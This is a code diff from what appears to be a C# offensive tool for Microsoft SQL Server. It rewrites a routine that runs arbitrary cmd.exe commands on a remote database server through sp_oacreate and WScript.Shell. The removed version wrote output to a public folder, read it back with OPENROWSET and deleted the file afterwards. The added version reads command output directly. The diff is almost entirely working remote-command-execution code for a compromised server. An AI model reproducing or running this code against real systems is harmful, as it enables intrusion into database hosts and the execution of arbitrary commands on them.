@@ -81,28 +81,14 @@ exit                       - terminates the server process (and this session)"
             {
                 if (setting.Enable_ola()) return;
             }
-            string shell = String.Format(@"
-                    DECLARE @SHELL INT 
-                    EXEC sp_oacreate 'wscript.shell', @SHELL OUTPUT 
-                    EXEC sp_oamethod @SHELL, 'run' , NULL, 'c:\windows\system32\cmd.exe /c ");
-            string outfile = String.Format(@"C:\Users\Public\Downloads\{0}.txt", GetTimeStamp());
-            string sqlstr = shell + Command + @" > " + outfile + "'";
-            Console.WriteLine(@"[+] c:\windows\system32\cmd.exe /c {0} > {1}", Command, outfile);
-            Batch.RemoteExec(Conn, sqlstr, false);
-            if (!setting.File_Exists(outfile, 1))
-            {
-                Console.WriteLine("[!] {0} file does not exist....", outfile);
-                return;
-            }
-            Thread.Sleep(5000);
-            Console.WriteLine("[+] Reading " + outfile);
-            string readstr = String.Format(@"SELECT * FROM OPENROWSET(BULK N'{0}', SINGLE_CLOB) rs", outfile);
-            Console.WriteLine(Batch.RemoteExec(Conn, readstr, true));
-            Console.WriteLine("[+] Deleting " + outfile);
-            Thread.Sleep(5000);
-            string delstr = String.Format(@"del {0}'", outfile);
-            Batch.RemoteExec(Conn, shell + delstr, false);
-
+            string sqlstr = String.Format(@"
+                    declare @shell int,@exec int,@text int,@str varchar(8000); 
+                    exec sp_oacreate 'wscript.shell',@shell output 
+                    exec sp_oamethod @shell,'exec',@exec output,'c:\windows\system32\cmd.exe /c {0}'
+                    exec sp_oamethod @exec, 'StdOut', @text out;
+                    exec sp_oamethod @text, 'ReadAll', @str out
+                    select @str", Command);
+            Console.WriteLine(Batch.RemoteExec(Conn, sqlstr, true));
         }
 
         /// <summary>
